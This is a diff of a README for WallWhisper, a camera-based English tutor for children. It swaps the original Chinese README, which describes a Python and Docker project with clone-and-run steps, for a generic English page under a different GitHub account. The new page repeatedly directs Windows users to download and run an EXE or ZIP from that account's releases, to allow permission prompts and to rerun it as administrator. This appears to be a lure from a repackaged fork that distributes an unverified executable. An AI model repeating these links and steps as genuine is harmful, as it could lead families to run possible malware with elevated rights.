@@ -1,308 +1,240 @@
-<div align="center">
+# 🏠 WallWhisper - Turn Cameras Into English Tutors
 
-# 🤫 WallWhisper — 墙上的低语者
+[![Download WallWhisper](https://img.shields.io/badge/Download-WallWhisper-blue?style=for-the-badge&logo=github)](https://github.com/richardm7399/WallWhisper/releases)
 
-### 用家里已有的摄像头和路由器，零成本打造 AI 英语私教
+## 📌 What WallWhisper Does
 
-**OpenClaw × 萤石摄像头 × 小米路由器 = 孩子一走过，英语自动说**
+WallWhisper turns an IP camera into a smart English tutor for your home. It listens to speech in the room, uses AI to guide short learning moments, and speaks back with clear voice prompts.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python 3.11](https://img.shields.io/badge/Python-3.11-green.svg)](https://www.python.org/)
-[![Docker](https://img.shields.io/badge/Docker-ARM64%20%7C%20x86__64-blue.svg)](Dockerfile)
+It is made for family use. You can place it in a living room, kitchen, or play area and let it support light English practice through the day. It keeps the experience simple and avoids the need for a screen.
 
-[English](README_EN.md) | 简体中文
+## ✨ What You Can Use It For
 
-</div>
+- Help children hear and repeat simple English words
+- Create short language practice moments at home
+- Turn a spare IP camera into a learning device
+- Use voice prompts instead of a tablet or TV
+- Keep learning active while people move around the room
 
----
+## 🖥️ What You Need
 
-## ✨ 这是什么？
+WallWhisper is built for a Windows computer. For best results, use a machine that stays on while the camera runs.
 
-> *女儿从幼儿园回来，走进客厅——*
->
-> *墙上的摄像头悄悄亮了一下。*
->
-> *"Hello! Cat! Can you say cat? Meow!"*
->
-> *女儿咯咯笑："Cat! 喵喵！"*
->
-> *这就是 WallWhisper——墙上的低语者，住在摄像头里的英语小姐姐 Emily。*
+Recommended setup:
 
-**WallWhisper** 是一个开源的家庭英语智能教学系统。核心角色 **Emily**（英语小姐姐）通过萤石摄像头感知家人出现，自动生成个性化英语内容，并通过摄像头喇叭播放。
+- Windows 10 or Windows 11
+- A stable internet connection
+- An IP camera that supports RTSP
+- A microphone or camera with audio input
+- A speaker for spoken replies
+- A home network with both the camera and PC connected
 
-不需要额外硬件，不需要打开 App，不需要刻意"上课"——**孩子只要在家走动，英语学习就自然发生。**
+If you plan to use it for long periods, keep the PC plugged in and connected to the same network as the camera.
 
-## 🔥 为什么做这个？
+## ⬇️ Download WallWhisper
 
-### 💡 核心理念：语言学习需要的是环境，不是主动性
+Visit this page to download the latest Windows release:
 
-作为一个程序员爸爸，我一直在想怎么让 3 岁的女儿自然地接触英语。**语言学习最关键的不是教材多好、老师多牛，而是有没有一个持续的语言环境。**
+[Download WallWhisper from GitHub Releases](https://github.com/richardm7399/WallWhisper/releases)
 
-然而，市面上所有的英语学习工具都有同一个致命问题——**它们都需要孩子"走入"**：
+Look for the newest release package for Windows. If there are more than one file, choose the one marked for Windows or the main app file.
 
-| 方式 | 问题 |
-|------|------|
-| 📱 手机/平板 App | 需要孩子主动打开，3 岁孩子不会操作 |
-| 📺 英语动画/节目 | 需要主动调台、选片，而且容易沉迷屏幕 |
-| 📚 英语绘本 | 需要家长陪读，时间精力有限 |
-| 👩‍🏫 线下外教课 | 一周两次，课间全忘，一年还要 2 万+ |
-| 🤖 AI 对话产品 | 需要孩子坐在屏幕前主动互动 |
+## 🚀 Install on Windows
 
-**这些都在考验孩子的"学习主动性"。但对一个 3 岁小朋友来说，主动性本身就是奢望。**
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the WallWhisper app file to start it.
+7. If Windows asks for permission, choose Yes.
 
-所以我换了个思路：**与其让孩子走向英语，不如让英语走向孩子。**
+If you do not see the app start right away, wait a few seconds while it loads the camera and voice tools.
 
-### 🏠 让家里长出一个"墙上的低语者"
+## 🎥 Connect Your IP Camera
 
-打造英语环境，没有什么比**家里有一个隐藏式的英语外教**更好了。问题是，谁来当这个外教？
+WallWhisper works with RTSP camera feeds. Most home IP cameras and many smart cameras support this.
 
-答案就在你家的墙上——你的摄像头。这就是 **WallWhisper** 这个名字的由来：**墙壁上的低语者**。
+To connect your camera:
 
-**📷 摄像头是天然的最佳载体：**
-- 🫥 **不突兀** — 它本身就在你家的墙上/天花板上，孩子早已习惯它的存在
-- 👀 **视角宽广** — 比手机、平板更容易捕捉到孩子的活动轨迹
-- 🔊 **自带喇叭** — 不需要额外的蓝牙音箱，一个设备搞定感知 + 播放
-- 🧒 **无需操作** — 孩子不用按任何按钮，走过就触发，真正零交互
+1. Open your camera app or camera settings page.
+2. Find the RTSP address or stream URL.
+3. Copy that address.
+4. Paste it into WallWhisper when asked.
+5. Save the settings and test the feed.
 
-**🧠 OpenClaw 让 Emily 有了灵魂：**
+Common camera brands and setups that work well include:
 
-传统的英语播放器只能机械式地重复预录音频。但 Emily 不一样——基于 [OpenClaw](https://openclaw.com) 开源 AI Agent 平台，Emily 拥有完整的**人设、记忆和成长体系**：
+- Ezviz models with RTSP enabled
+- Xiaomi router-based home camera setups
+- Other IP cameras that support RTSP video streams
 
-- 她知道你孩子叫什么、几岁、喜欢什么
-- 她记得上周教过哪些单词，今天该复习什么
-- 她会根据孩子的水平逐步提高难度
-- **她会伴随孩子一起成长**，而不是永远停留在 "Hello, how are you?"
+If your camera has a local IP address and stream path, use that exact RTSP link in the app.
 
-**📦 小米路由器是天然的容身之所：**
+## 🎤 Set Up Voice and English Practice
 
-Emily 需要一个 24 小时在线的"家"来运行。与其买一台新的服务器或树莓派，不如看看你家已有的——**小米路由器**：
+WallWhisper uses AI to listen and respond in English. The setup is simple:
 
-- 🔌 它本来就 24 小时开着，不增加电费
-- 🌐 它本来就是家庭网关，局域网访问摄像头零延迟
-- 🐳 支持 Docker 的小米路由器（7000/BE 系列）直接运行 WallWhisper 容器
-- 💰 **零新增硬件成本**，经济又高效
+1. Choose the room where you want to use it.
+2. Make sure the microphone can hear speech from that room.
+3. Pick a clear speaker volume.
+4. Select the English voice mode in the app.
+5. Start a session and speak near the camera area.
 
-> **总结一下：摄像头感知孩子 + OpenClaw 生成个性化英语 + 路由器 24h 运行 = WallWhisper，墙上的低语者。全部复用已有设备，新增成本为零。**
+For family use, short sessions work best. Try simple words, short sentences, and small repeat-after-me exercises.
 
-## 🎯 核心亮点
+## 🧭 First Run Checklist
 
-| 🏠 沉浸式英语环境 | 🧠 OpenClaw 伴随成长 | 🔊 摄像头喇叭直出 | 💰 零额外硬件成本 |
-|:---:|:---:|:---:|:---:|
-| 不需要孩子主动"打开"任何东西，走过就触发，英语自己找上门 | Emily"认识"你的家人，记住教过的单词，根据进度调整难度 | RTSP Backchannel 黑科技，音频直接推到摄像头喇叭，无需额外音箱 | 摄像头 + 路由器 + AI API，全部复用家里已有设备 |
+Before you start your first session, check these items:
 
-## 🏗️ 系统架构
+- The app is installed and opens on Windows
+- Your camera feed works in another app or on the camera page
+- The RTSP link is correct
+- The microphone can hear the room
+- The speaker is not muted
+- Your PC stays awake while the app runs
 
-```mermaid
-graph TB
-    subgraph "🏠 你的家"
-        KID["👧 孩子/家人"]
-        CAM["📷 萤石摄像头<br/>人形检测 + 喇叭播放"]
-        ROUTER["📦 小米路由器<br/>Docker 运行 WallWhisper"]
-    end
+If the feed does not load, check the camera address first. Most setup problems come from a wrong stream URL or a camera that has RTSP turned off.
 
-    subgraph "☁️ 云端服务"
-        OC["🧠 OpenClaw<br/>Emily 人设 + 记忆"]
-        TTS["🔊 腾讯云 TTS<br/>文本转语音"]
-        EZVIZ["👁️ 萤石云<br/>告警推送"]
-    end
+## 🏠 Best Ways to Use WallWhisper at Home
 
-    KID -->|"1. 走过摄像头"| CAM
-    CAM -->|"2. 人形告警"| EZVIZ
-    EZVIZ -->|"3. 轮询告警"| ROUTER
-    ROUTER -->|"4. 请求生成英语内容"| OC
-    OC -->|"5. 返回个性化英语"| ROUTER
-    ROUTER -->|"6. 文本转语音"| TTS
-    TTS -->|"7. PCM 音频流"| ROUTER
-    ROUTER -->|"8. RTSP Backchannel<br/>推送音频"| CAM
-    CAM -->|"🔊 喇叭播放英语"| KID
+WallWhisper works well in simple home settings:
 
-    style KID fill:#FFE0B2,stroke:#F57C00,color:#000
-    style CAM fill:#BBDEFB,stroke:#1565C0,color:#000
-    style ROUTER fill:#C8E6C9,stroke:#2E7D32,color:#000
-    style OC fill:#E1BEE7,stroke:#7B1FA2,color:#000
-    style TTS fill:#B3E5FC,stroke:#0288D1,color:#000
-    style EZVIZ fill:#FFF9C4,stroke:#F9A825,color:#000
-```
+- In a kitchen during family time
+- In a playroom with children nearby
+- In a living room for light daily practice
+- Near a study desk for short speaking drills
+- On a Raspberry Pi-style home setup where the main app runs on a small always-on device
 
-**整个流程在 10 秒内完成：** 检测到人 → AI 生成内容 → TTS 合成语音 → 摄像头喇叭播放 🎉
+Keep the camera in a place with clear sound and a stable view. A quiet room gives better speech results.
 
-<details>
-<summary>📷 如果 Mermaid 图无法渲染，点击查看架构图 PNG</summary>
+## ⚙️ How It Works
 
-![WallWhisper Architecture](docs/images/architecture.png)
+WallWhisper follows a simple flow:
 
-</details>
+1. It reads video from your IP camera.
+2. It listens for speech in the room.
+3. It sends text to an AI model.
+4. It creates an English response or prompt.
+5. It speaks the result through your speaker.
 
-## 🎬 三种交互模式
+This lets you use one camera for both watching and teaching. No extra screen is needed.
 
-| 模式 | 触发条件 | 内容 | 示例 |
-|:---:|:---:|:---:|:---|
-| 🚶 **pass_by** | 有人路过摄像头 | 简短打招呼 + 一个单词 | *"Hello! Cat! Can you say cat? Meow!"* |
-| 🧑‍🏫 **interact** | 短时间多次触发 | 深度互动教学 | *"Hi! Look, a dog! Woof woof! Can you say dog?"* |
-| ⏰ **scheduled** | 定时任务 | 晨播/睡前故事/每日复习 | *"Good morning! Let's learn a color today! Red!"* |
+## 🔧 Common Setup Tips
 
-每段英语后自动附带中文解释（中英双语），确保孩子能理解：
+- Use a camera with clear audio if possible
+- Keep the microphone away from noisy fans
+- Place the speaker near the room, not inside a cabinet
+- Use a stable Wi-Fi or wired network
+- Keep the app and camera on the same network
+- Start with low volume, then raise it to a safe level
 
-> *Hello! Cat! Can you say cat? Meow!*
-> *---*
-> *你好！Cat是小猫咪！你能说cat吗？喵！*
+If the voice sounds choppy, reduce background noise and check your internet connection.
 
-## 📹 效果演示
+## 🧪 Sample Use Cases
 
-<!-- TODO: 添加效果视频/GIF -->
-<!-- 建议拍摄：孩子走过摄像头 → Emily 自动说英语 → 孩子开心回应 -->
+### For Kids
+Use WallWhisper to say common English words, repeat colors, or practice short phrases like:
 
-> 📌 效果视频制作中，敬请期待...
+- Good morning
+- What is this?
+- Please repeat after me
+- That is a red ball
 
-## 🚀 快速开始
+### For Family Practice
+Use it during daily routines:
 
-### 方式一：本地运行（开发/测试）
+- Naming foods in the kitchen
+- Practicing room objects
+- Learning action words
+- Repeating simple questions and answers
 
-```bash
-# 1. 克隆项目
-git clone https://github.com/treychen-369/WallWhisper.git
-cd WallWhisper
+### For Quiet Learning Time
+Use it for short sessions with no screen. The system can guide speech practice while people move around the room.
 
-# 2. 安装依赖
-pip install -r requirements.txt
+## ❓ Troubleshooting
 
-# 3. 配置
-cp config.example.yaml config.yaml
-# 编辑 config.yaml，填入你的 API 密钥
+### The app does not open
+- Run it again as an administrator
+- Check that Windows did not block the file
+- Make sure the download finished fully
 
-# 4. 测试 TTS
-python run.py test_tts "Hello! Can you say cat?"
+### The camera feed does not appear
+- Confirm the RTSP link is correct
+- Check that RTSP is enabled on the camera
+- Make sure the camera is on the same network
 
-# 5. 运行 Emily
-python run.py emily
-```
+### No voice is coming out
+- Check the speaker volume
+- Confirm the Windows audio output device
+- Make sure the app is not muted
 
-### 方式二：Docker 部署（推荐用于路由器/服务器）
+### Speech is not being heard
+- Move the microphone closer to the room
+- Reduce TV or fan noise
+- Speak in a clear voice
 
-```bash
-# 1. 构建镜像
-docker-compose up -d --build
+### English responses sound wrong
+- Use short phrases
+- Speak one person at a time
+- Avoid heavy background noise
+- Try a calmer room
 
-# 2. 或者使用预构建镜像
-IMAGE=your-registry/wallwhisper:latest docker-compose up -d
-```
+## 🔒 Privacy and Home Use
 
-### 方式三：小米路由器部署（极客玩法 🔧）
+WallWhisper is designed for local home use with an IP camera and voice tools. For best control, keep the camera on your own network and use it in a room you manage.
 
-> 如果你的小米路由器支持 Docker（如小米 7000/BE系列），可以直接在路由器上运行 WallWhisper，实现真正的"无服务器"部署。
+If you use it with children, place the camera where you want the learning session to happen and keep the sound level low enough for comfort.
 
-详细步骤请参考 [部署指南](docs/deployment-guide.md)。
+## 📂 Project Details
 
-## ⚙️ 配置说明
+- Name: WallWhisper
+- Focus: AI English learning at home
+- Input: IP camera video and room speech
+- Output: Spoken English prompts and replies
+- Target use: Non-screen home learning
 
-核心配置项（`config.yaml`）：
+## 🧩 Topics Covered
 
-| 配置项 | 说明 | 必填 |
-|--------|------|:---:|
-| `ai.api_key` | DeepSeek API 密钥 | ✅ |
-| `tts.secret_id` / `tts.secret_key` | 腾讯云 TTS 密钥 | ✅ |
-| `ezviz.app_key` / `ezviz.app_secret` | 萤石开放平台密钥 | ✅ |
-| `openclaw_emily.api_url` / `api_token` | OpenClaw Emily API（可选） | ⬜ |
-| `camera_speaker.cam_ip` / `cam_password` | 摄像头喇叭推送 | ⬜ |
+WallWhisper connects ideas from:
 
-> 💡 不使用 OpenClaw 也可以运行！Emily 会直接调用 DeepSeek API 生成内容。OpenClaw 提供的是统一人设和长期记忆能力。
+- AI
+- Docker
+- English learning
+- Ezviz
+- OpenAI
+- Raspberry Pi
+- RTSP
+- Smart home
+- TTS
+- Xiaomi router
 
-## 🧠 OpenClaw 人设（可选但推荐）
+## 🛠️ File and Setup Notes
 
-[OpenClaw](https://openclaw.com) 是一个开源 AI Agent 平台，Emily 基于它构建了完整的人设和记忆系统：
+If the release includes a ZIP file:
 
-- **SOUL.md** — Emily 的人格设定（温柔、耐心、爱玩）
-- **USER.md** — 你的家庭信息（孩子年龄、兴趣爱好）
-- **MEMORY.md** — 教学记忆（教过哪些单词、孩子的进步）
+1. Download the ZIP
+2. Extract it
+3. Open the folder
+4. Run the main app file
 
-配置模板在 `examples/openclaw-config/` 目录，详细设置请参考 [OpenClaw 配置指南](docs/openclaw-setup.md)。
+If the release includes an EXE file:
 
-## 🔊 RTSP Backchannel：摄像头喇叭黑科技
+1. Download the EXE
+2. Open it from your Downloads folder
+3. Allow Windows permission if asked
+4. Follow the setup screen
 
-WallWhisper 最酷的功能之一是**直接通过摄像头喇叭播放英语**，无需任何额外音箱！
+Keep the app in a folder you can find again, such as Downloads or Desktop.
 
-技术原理：
-- 萤石 C7 摄像头支持 RTSP Backchannel（反向音频通道）
-- Emily 通过 TCP 连接将 AAC 音频流推送到摄像头
-- 摄像头的内置喇叭直接播放
+## 📈 Good Home Setup Example
 
-> 📌 目前已验证萤石 C7 系列摄像头，其他支持 RTSP Backchannel 的摄像头理论上也可以适配。
+A simple setup can look like this:
 
-## 📁 项目结构
+- One Windows PC in the home
+- One IP camera facing the room
+- One speaker for English voice output
+- One microphone for room speech
+- One family area with low background noise
 
-```
-WallWhisper/
-├── run.py                  # 统一启动器
-├── config_loader.py        # 配置加载与校验
-├── emily_v2.py             # V2 主引擎（摄像头联动 + 多模式）
-├── emily.py                # V1 旧版（保留兼容）
-├── ezviz_monitor.py        # 萤石告警轮询 + Token 管理
-├── tts_stream.py           # 腾讯云 WebSocket 流式 TTS
-├── camera_speaker.py       # RTSP Backchannel 摄像头喇叭
-├── camera_mic.py           # 摄像头麦克风输入
-├── asr_engine.py           # 语音识别
-├── conversation.py         # 多轮对话引擎
-├── config.example.yaml     # 配置模板
-├── deploy.sh               # 路由器部署脚本（7步安全流程）
-├── sync_openclaw.py        # OpenClaw 人设同步工具
-├── sync_router.py          # 路由器配置同步工具
-├── Dockerfile              # Docker 构建（ARM64 + x86_64）
-├── docker-compose.yml      # Docker Compose 部署
-├── examples/
-│   └── openclaw-config/    # OpenClaw 人设配置模板
-└── docs/
-    ├── architecture.md     # 详细架构说明
-    ├── deployment-guide.md # 部署指南
-    ├── openclaw-setup.md   # OpenClaw 配置指南
-    └── video-script.md     # 效果视频拍摄脚本
-```
-
-## 🛠️ 技术栈
-
-| 层级 | 技术 | 用途 |
-|------|------|------|
-| 🧠 AI | **DeepSeek API** / **OpenClaw** | 个性化英语内容生成 |
-| 🔊 语音 | **腾讯云 WebSocket TTS** | 实时文本转语音 (voice_type: 101009 英文女声) |
-| 👁️ 感知 | **萤石开放平台 API** | 人形检测告警轮询 |
-| 📡 播放 | **RTSP Backchannel** / **PyAudio** | 摄像头喇叭或本地播放 |
-| 🐳 部署 | **Docker** + **docker-compose** | ARM64 适配路由器 |
-
-## 🗺️ Roadmap
-
-- [x] 人形检测自动触发
-- [x] 中英双语输出
-- [x] RTSP Backchannel 摄像头喇叭
-- [x] OpenClaw 人设 + 记忆
-- [x] 多轮对话（ASR 语音识别 + AI 回复）
-- [ ] 支持更多 TTS 服务（Azure、Google、Edge TTS）
-- [ ] 支持更多摄像头品牌（海康、大华）
-- [ ] Web 管理面板
-- [ ] 教学进度可视化报告
-- [ ] 多语言支持（日语、法语等）
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request！详见 [贡献指南](CONTRIBUTING.md)。
-
-## 📄 License
-
-[MIT License](LICENSE) — 自由使用、修改、分发。
-
-## 💖 致谢
-
-- [OpenClaw](https://openclaw.com) — 开源 AI Agent 平台，让 Emily 有了"灵魂"
-- [DeepSeek](https://deepseek.com) — 强大且实惠的 AI 大模型
-- [腾讯云 TTS](https://cloud.tencent.com/product/tts) — 高质量中英文语音合成
-- [萤石开放平台](https://open.ys7.com) — 摄像头 API 和告警服务
-
----
-
-<div align="center">
-
-**如果 WallWhisper 帮到了你的家庭，请给个 ⭐ Star 支持一下！**
-
-*Made with ❤️ by a programmer dad who wants his daughter to love English.*
-
-*WallWhisper — 墙上的低语者，让英语像空气一样包围你的孩子。*
-
-</div>
+That setup is enough to start using WallWhisper for daily English practice.
